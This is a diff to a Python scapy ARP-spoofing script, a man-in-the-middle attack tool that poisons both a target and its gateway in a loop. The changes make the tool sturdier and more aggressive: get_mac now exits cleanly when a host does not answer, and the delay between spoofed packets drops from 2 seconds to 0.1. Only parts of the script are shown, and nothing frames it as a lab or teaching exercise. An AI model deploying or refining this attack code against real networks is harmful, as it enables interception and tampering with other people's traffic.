@@ -1,6 +1,7 @@
 #! /usr/bin/env python
 
 import os
+import sys
 import time
 import scapy.all as scapy
 import argparse
@@ -17,7 +18,11 @@ def get_mac(ip):
     arp_request_broadcast = broadcast/arp_request
 
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    return answered_list[0][1].hwsrc
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        print(f"No response from {ip}. Unable to get MAC address.")
+        sys.exit()
 
 
 def spoof(target_ip, spoof_ip):
@@ -45,7 +50,7 @@ try:
         spoof(gateway_ip, target_ip)
         sent_packets_count += 2
         print(f"\r[+] Sent packets: {sent_packets_count}", end="")
-        time.sleep(2)
+        time.sleep(0.1)
 except KeyboardInterrupt:
     print("\n[-] Detected CTRL + C ...")
 finally:
